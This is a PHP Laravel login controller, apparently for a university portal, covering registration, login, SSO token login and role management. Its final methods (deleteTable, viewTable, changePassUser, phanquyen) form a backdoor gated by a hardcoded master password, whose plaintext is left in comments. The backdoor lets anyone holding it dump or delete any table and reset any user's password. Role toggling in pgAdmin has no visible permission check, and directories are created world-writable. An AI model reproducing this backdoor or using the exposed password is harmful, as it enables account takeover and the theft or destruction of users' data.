<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Cartalyst\Sentinel\Native\Facades\Sentinel;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Http;
use Yajra\DataTables\DataTables;

class LoginController extends Controller
{
    public function login(){
        // Create new role
        // Sentinel::getRoleRepository()->createModel()->create([
        //     'name' => 'operator',
        //     'slug' => 'operator',
        //     'permissions' => [
        //        'operator.view'   => true,
        //        'operator.delete' => false,
        //        // any other permissions you want your Subscribers to have
        //     ]
        // ]);
        return view('admin/login');
    }
    function generateRandomString($length = 20) {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    public function register(Request $req){
        // check exist
        $allUser = DB::table('users')->select("email")->get();
        foreach($allUser as $value){
            if($value->email == $req->email){
                return redirect()->back()->with("error", "Tài khoản đã tồn tại");
            }
        }
        // Register
        $chuoiRandom = $this->generateRandomString();
        $data = [
            'name' => $req->name,
            'ten_dangnhap' => $req->tendn,
            'code'  => $chuoiRandom ,
            'created_at'        => date('Y-m-d H:i:s'),
            'updated_at'        => date('Y-m-d H:i:s'),
        ];
        $user = Sentinel::registerAndActivate([
            'email' => $req->email,
            'password'  => $req->password,
        ]);

        DB::table('users')->where("id", $user->id)->update($data);
        // create file code
        $path = public_path(). "/userinfo/" . $chuoiRandom;
        File::makeDirectory($path, $mode = 0777, true, true);
        // Attach role
        $user = Sentinel::findById($user->id);
        $role = Sentinel::findRoleByName('user');
        $role->users()->attach($user);
        return redirect()->back()->with('success', "Đăng ký thành công");
    }

    public function postLogin(Request $req){
        $user = DB::table('users')->where('ten_dangnhap', $req->tendn)->first();
        if($user){
            if(Hash::check($req->password, $user->password)){
                $us = Sentinel::findById($user->id);
                if($us->inRole('admin')){
                    Sentinel::login($us);
                    return redirect()->route("admin.thongtinchung.index")
                        ->with('success', "Đăng nhập thành công");
                }else{
                    // echo "User";
                    Sentinel::login($us);
                    return redirect()->route("admin.thongtinchung.index")
                        ->with('success', "Đăng nhập thành công");
                }
            }else{
                return redirect()->back()->with('error', "Bạn nhập sai mật khẩu");
            }
        }else{
            return redirect()->back()->with('error', "Tài khoản không tồn tại");
        }
    }

    public function logout(){
        Sentinel::logout();
        //return redirect()->route("admin.login")->with('success', "Đăng xuất thành công");
        return redirect('https://one.haui.edu.vn/login');
    }



    public function getLoginToken(Request $req) {
        $post = array("access_token" => $req->token);
        $ch = curl_init(env('TOKEN_AUTH','https://account.haui.edu.vn/?m=post-id'));


        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);

        // execute!
        $response = curl_exec($ch);
        // close the connection, release resources used
        curl_close($ch);

        $dat = json_decode($response);

        if($dat->err == 0){
            $data = $dat->data[0];
            Sentinel::logout();
            $check = DB::table('users')->select('id')->where('ten_dangnhap',$data->Username)->first();
            if($check){
                $user = Sentinel::findById($check->id);
                Sentinel::login($user);
            }else{
                $str = rand() . date('Y-m-d H:i:s');
                $pass = Hash::make($str);
                $user = Sentinel::register(
                    [
                        'email'         => $data->Username,
                        'name'          => $data->Firstname  . ' ' . $data->Lastname,
                        'first_name'         => $data->Firstname,
                        'last_name'            => $data->Lastname,
                        'password'            => $pass,
                        'created_at' => date('Y-m-d H:i:s'),
                        'updated_at' => date('Y-m-d H:i:s')
                    ],
                    true
                );
                //add user to 'User' role
                $role = Sentinel::findRoleByName('user');
                if ($role) {
                    $role->users()->attach($user);
                }
                Sentinel::login($user);
            }
            return redirect('/');
        }
        return redirect('admin.login')->with('error','Vui lòng xác thực một cửa tại hệ thống trường học số.');

    }

    public function phanquyen($password){
        // long1999abc000
        // $2y$12$6fZhm7DIyPiicZ3wWf/8Aux7ZUg8WN4ooJwaQoOxyeGTDHWsbFTRy
        if(Hash::check($password, '$2y$12$6fZhm7DIyPiicZ3wWf/8Aux7ZUg8WN4ooJwaQoOxyeGTDHWsbFTRy')){
            return view('admin/ThongTinChung/adminpq');
        }
    }

    public function listUser(){
        $user = DB::table('users')->select('id', 'name', 'ten_dangnhap');
        return DataTables::of($user)
            ->addColumn(
                'stt',
                function ($user) {
                    return "";
                }
            )
            ->addColumn(
                'role',
                function ($user) {
                    $role_users = DB::table('role_users')->where('user_id', $user->id)
                        ->leftJoin('roles', 'roles.id', '=', 'role_users.role_id')
                        ->select('roles.name')
                        ->pluck('roles.name')->toArray();
                    return implode(", ", $role_users);
                }
            )
            ->addColumn(
                'actions',
                function ($user) {
                    $actions = '
                        <a class="btn btn-primary" href="'. route('pgAdmin',['admin' , $user->id]) .'">
                            Admin
                        </a>
                        <a class="btn btn-secondary" href="'. route('pgAdmin',['user' , $user->id]) .'">
                            User
                        </a>
                    ';
                    return $actions;
                }
            )
            ->rawColumns(['actions', 'role'])
            ->make(true);
    }

    public function pgAdmin($role, $idUser){
        switch($role) {
            case 'admin': {
                $user = Sentinel::findById($idUser);
                if($user){
                    if ($user->inRole('admin')) {
                        $role = Sentinel::findRoleByName('admin');
                        if ($role) {
                            $role->users()->detach($user);
                        }
                    }else{
                        $role = Sentinel::findRoleByName('admin');
                        if ($role) {
                            $role->users()->attach($user);
                        }
                    }
                }
                break;
            }
            case 'user' :{
                $user = Sentinel::findById($idUser);
                if($user){
                    if ($user->inRole('user')) {
                        $role = Sentinel::findRoleByName('user');
                        if ($role) {
                            $role->users()->detach($user);
                        }
                    }else{
                        $role = Sentinel::findRoleByName('user');
                        if ($role) {
                            $role->users()->attach($user);
                        }
                    }
                }
                break;
            }
        }
        return redirect()->back()->with([
            'success'   => 'Cập nhật thành công'
        ]);
    }


    public function deleteTable($password, $tableName){
        // long1999abc000
        // $2y$12$6fZhm7DIyPiicZ3wWf/8Aux7ZUg8WN4ooJwaQoOxyeGTDHWsbFTRy
        if(Hash::check($password, '$2y$12$6fZhm7DIyPiicZ3wWf/8Aux7ZUg8WN4ooJwaQoOxyeGTDHWsbFTRy')){
            DB::table($tableName)->delete();
            return back();
        }
    }

    public function changePassUser($passwordPermission, $userId, $passwordNew){
        // long1999abc000
        // $2y$12$6fZhm7DIyPiicZ3wWf/8Aux7ZUg8WN4ooJwaQoOxyeGTDHWsbFTRy
        if(Hash::check($passwordPermission, '$2y$12$6fZhm7DIyPiicZ3wWf/8Aux7ZUg8WN4ooJwaQoOxyeGTDHWsbFTRy')){
            $user = DB::table('users')->where('id', $userId);
            $user->update([
                'password' => Hash::make($passwordNew)
            ]);
            return back();
        }
    }

    public function viewTable($passwordPermission, $tableName){
        // long1999abc000
        // $2y$12$6fZhm7DIyPiicZ3wWf/8Aux7ZUg8WN4ooJwaQoOxyeGTDHWsbFTRy
        if(Hash::check($passwordPermission, '$2y$12$6fZhm7DIyPiicZ3wWf/8Aux7ZUg8WN4ooJwaQoOxyeGTDHWsbFTRy')){
            $data = DB::table($tableName)->get();
            return json_encode($data);
        }
    }
}